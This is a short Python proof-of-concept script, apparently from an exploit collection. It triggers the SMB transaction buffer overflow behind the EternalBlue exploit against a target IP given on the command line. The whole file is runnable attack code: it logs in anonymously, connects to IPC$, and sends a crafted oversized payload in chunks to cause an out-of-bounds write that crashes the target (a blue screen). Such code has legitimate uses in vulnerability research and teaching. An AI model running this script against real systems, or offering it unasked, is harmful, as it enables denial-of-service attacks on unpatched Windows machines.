from impacket import smb
from mysmb import MYSMB
from struct import pack
import sys

'''
PoC: demonstrates how NSA eternalblue triggers the buffer overflow
'''

USERNAME = ''
PASSWORD = ''

if len(sys.argv) != 2:
	print("{} <ip>".format(sys.argv[0]))
	sys.exit(1)

target = sys.argv[1]


conn = MYSMB(target)
conn.login(USERNAME, PASSWORD)

tid = conn.tree_connect_andx('\\\\'+target+'\\'+'IPC$')
conn.set_default_tid(tid)

# OOB write ~0x8c00 for BSOD
payload = pack('<I', 0x10000)
payload += pack('<BBH', 0, 0, 0xc003) + 'A'*0xc004
payload += pack('<BBH', 0, 0, 0xcc00) + 'B'*0x4000

mid = conn.next_mid()
# NT function can be any
# TRANS2_OPEN2 (0)
conn.send_nt_trans(2, setup=pack('<H', 0), mid=mid, param='\x00'*30, data=payload[:1000], totalDataCount=len(payload))
i = 1000
while i < len(payload):
	sendSize = min(4096, len(payload) - i)
	conn.send_trans2_secondary(mid=mid, data=payload[i:i+sendSize], dataDisplacement=i)
	i += sendSize

conn.recvSMB()

conn.disconnect_tree(tid)
conn.logoff()
conn.get_socket().close()
